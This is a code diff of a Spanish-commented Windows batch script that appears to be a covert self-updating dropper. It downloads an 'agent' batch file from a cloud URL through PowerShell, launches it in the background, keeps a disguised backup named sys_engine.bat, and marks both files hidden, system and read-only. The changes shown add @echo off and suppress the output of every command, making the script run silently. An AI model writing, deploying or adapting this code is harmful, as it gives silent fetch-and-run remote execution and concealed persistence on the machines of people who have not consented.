@@ -1,4 +1,4 @@
-
+    @echo off
     setlocal enabledelayedexpansion
 
 
@@ -23,7 +23,7 @@
 
     :: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
     :: Intentamos bajar la versión de la nube a un temporal
-    powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VLINEA%')" 
+    powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VLINEA%')" >nul 2>&1
 
     ::
     ::
@@ -36,7 +36,7 @@
     ::if exist "%VERSION_LOCAL%" (
     ::    set /p LINEA_LOCAL=<"%VERSION_LOCAL%"
     ::) else (
-    ::    copy /y "%VLINEA%" "%VERSION_LOCAL%" 
+    ::    copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
     ::    set "LINEA_LOCAL=0"
     ::)
     if exist "%VERSION_LOCAL%" (
@@ -55,26 +55,25 @@
         start /b "" cmd /c "%AGENTE_FILE%"
         )
         ::--- 4. RESTAURACIÓN Y EJECUCIÓN ---
-        del "%VLINEA%" 
+        del "%VLINEA%" >nul 2>&1
         exit
     ) else (
-        copy /y "%VLINEA%" "%VERSION_LOCAL%" 
-        del "%VLINEA%" 
+        copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
+        del "%VLINEA%" >nul 2>&1
 
         rem Si la nube tiene una versión superior, descargamos el nuevo Agente
         rem 2.1 DESBLOQUEO TÁCTICO ANTES DE SOBREESCRIBIR
 
-        attrib -h -s -r "%AGENTE_FILE%" 
-        attrib -h -s -r "%BACKUP_DIR%\sys_engine.bat" 
+        attrib -h -s -r "%AGENTE_FILE%" >nul 2>&1
+        attrib -h -s -r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
                 
         rem 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
         rem Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
-        powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" 
-        copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" 
+        powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
+        copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
                 
         rem 2.3 RE-ACTIVACIÓN DE ESCUDOS
-        attrib +h +s +r "%AGENTE_FILE%" 
-        attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" 
+        attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
+        attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
             
     )
-    timeout /t 1000
